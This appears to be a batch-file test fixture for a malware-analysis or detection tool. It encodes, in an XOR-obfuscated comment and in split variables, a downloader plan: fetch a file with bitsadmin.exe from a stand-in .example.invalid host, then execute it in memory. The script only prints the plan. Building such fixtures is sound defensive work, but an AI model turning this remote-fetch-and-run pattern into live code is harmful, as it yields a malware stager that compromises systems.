@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:hex_pairs|xor_5a
rem HUNTRESS-MATERIAL:2c676b26292e3f2a29673b392b2f33283f05283f37352e3f763e33292a3b2e393205373f37352823263b3e3b2a2e3f286738332e293b3e373334743f223f26292e3b3d3f0539352f342e676b263d283b2a32672933343d363f26343f222e05363b343d2f3b3d3f673435343f26393b372a3b333d3405333e67393b372a3b333d34776b6b6d6c626f6a686b6e262f283667322e2e2a296075756b6b6d6c626f6a686b6e743f223b372a363f7433342c3b36333e756b3f3f6d396d3869743e3b2e
rem analyst reconstruction fixture
rem HUNTRESS-EXTENSION:bat
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
set "v_a0=v=1|steps=acquire_remote,dispatch_memory|adapter"
set "v_a1==bitsadmin.exe|stage_count=1|graph=single|next_l"
set "v_a2=anguage=none|campaign_id=campaign-1176850214|url"
set "v_a3==https://1176850214.example.invalid/1ee7c7b3.dat"
goto :HUNTRESS_SEPARATOR_DONE
ver >nul && rem HUNTRESS separator double ampersand
:HUNTRESS_SEPARATOR_DONE
rem no neutral statements
set "HUNTRESS_READY=1"
if defined HUNTRESS_READY set "cfg="
for %%G in (0 1 2 3) do call set "cfg=%%cfg%%%%v_a%%G%%"
echo(!cfg!
exit /b 0
:HUNTRESS_PLAN
echo bitsadmin.exe GET https://1176850214.example.invalid/1ee7c7b3.dat then dispatch memory
exit /b 0
